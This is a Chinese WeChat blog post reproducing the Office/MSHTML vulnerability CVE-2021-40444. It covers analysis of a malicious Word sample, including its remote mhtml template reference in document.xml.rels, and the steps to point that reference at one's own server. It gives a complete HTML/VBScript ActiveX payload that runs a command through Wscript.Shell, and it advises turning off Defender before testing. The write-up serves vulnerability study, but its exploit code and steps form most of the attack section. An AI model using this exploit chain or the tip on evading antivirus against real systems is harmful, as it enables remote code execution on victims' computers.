#  CVE-2021-40444复现

原创 查鲁特 [ 边界骇客 ](javascript:void\(0\);)

**边界骇客** ![]()

微信号 no__root

功能介绍 科技向善，科技理应向善

____

__

收录于话题

**前言:这几天导出都是这个漏洞的通告，就简单看了下。  
**

 **  
**

 **1.CVE-2021-40444**

这个漏洞严格来说并不能算一个新的漏洞，Windows一些自身的产品如（office，outlook）能调用IE浏览器能执行ACTIVEX也不是啥新闻了，去年的时候我就有发一篇文章关于Outlook的滥用，造成命令执行。

  * 

    
    
    https://www.freebuf.com/articles/network/243747.html

![](https://gitee.com/fuli009/images/raw/master/public/20210910153729.png)

这边值得注意的一点就是，即使在新人中心禁用了office的ActiveX也是无效，因为最后执行ActiveX的是IE浏览器而非office(你们要抓的是周树人，和我鲁迅有什么关系？)  

![](https://gitee.com/fuli009/images/raw/master/public/20210910153730.png)

  

 **2.样本分析**

一开始没有样本，只有一串样本hash。通过反查hash绕了几层，最终在anyrun下载到样本。

  * 

    
    
    样本md5:d1837399df37757e5ebd04f45746301a

虚拟机打开样本:  

![](https://gitee.com/fuli009/images/raw/master/public/20210910153731.png)

典型远程模板加载的特征，看到触发方式和通报，利用姿势大概就猜到了，后面就暂时不看了。

* * *

  1. 把样本后缀改成zip，解压  

  2. 路径:word→_rels→document.xml.rels

![](https://gitee.com/fuli009/images/raw/master/public/20210910153732.png)

明显可以从文件中看到引用了mhtml，然后Windows默认浏览器执行ActiveX最后造成代码执行。

  

 **3.复现**

既然是老姿势，直接把配置文件地址，为我们服务器的地址。

![](https://gitee.com/fuli009/images/raw/master/public/20210910153733.png)

html内容改成弹计算器吧:

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <html><head><meta http-equiv="Content-Language" content="en-us"><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><title>Outlook</title><script id=clientEventHandlersVBS language=vbscript><!-- Sub window_onload()     Set cmd = CreateObject("Wscript.Shell")     cmd.Run("calc") End Sub--></script></head><body><h1>CVE-2021-40444</h1> <object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data="" width="100%" height="100%"></object></body></html>

![](https://gitee.com/fuli009/images/raw/master/public/20210910153734.png)

  

 **写在最后:defender查的紧，需要关闭后测试。**

｡:.ﾟヽ(｡◕‿◕｡)ﾉﾟ.:｡+ﾟ防盗专用｡:.ﾟヽ(｡◕‿◕｡)ﾉﾟ.:｡+ﾟ

 ^_^文章来源：微信公众号（边界骇客） ^_^

![](https://gitee.com/fuli009/images/raw/master/public/20210910153736.png)

 **  
**  

![]()

查鲁特

![赞赏二维码]() **微信扫一扫赞赏作者** 赞赏

已喜欢，[对作者说句悄悄话](javascript:;)

取消 __

#### 发送给作者

发送

最多40字，当前共字

[](javascript:;) 人赞赏

上一页 [1](javascript:;)/3 下一页

长按二维码向我转账

受苹果公司新规定影响，微信 iOS 版的赞赏功能被关闭，可通过二维码转账支持公众号。

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

CVE-2021-40444复现

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

